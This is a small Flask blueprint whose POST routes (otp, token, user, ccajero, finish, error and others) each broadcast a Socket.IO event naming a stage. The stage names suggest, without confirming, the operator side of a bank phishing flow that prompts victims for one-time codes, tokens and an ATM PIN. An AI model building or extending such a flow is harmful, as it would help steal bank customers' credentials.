from flask import request, blueprints, redirect, session, render_template, jsonify
from config.bd import socketio
from flask_socketio import emit

events_routes = blueprints.Blueprint("events", __name__)

@events_routes.route('/otp', methods=['POST'])
def otp():
    socketio.emit('posting', {'valor': 'otp'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/newOtp', methods=['POST'])
def newOtp():
    socketio.emit('posting', {'valor': 'newOtp'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/user', methods=['POST'])
def user():
    socketio.emit('posting', {'valor': 'user'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/finish', methods=['POST'])
def finish():
    socketio.emit('posting', {'valor': 'finish'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/token', methods=['POST'])
def token():
    socketio.emit('posting', {'valor' : 'token'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/newToken', methods=['POST'])
def newToken():
    socketio.emit('posting', {'valor' : 'newToken'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/ccajero', methods=['POST'])
def ccajero():
    socketio.emit('posting', {'valor' : 'ccajero'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/ccajeror', methods=['POST'])
def ccajeror():
    socketio.emit('posting', {'valor' : 'ccajeror'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200

@events_routes.route('/error', methods=['POST'])
def error():
    socketio.emit('posting', {'valor' : 'error'}, namespace='/')
    
    return jsonify({'message': 'Exito'}), 200                          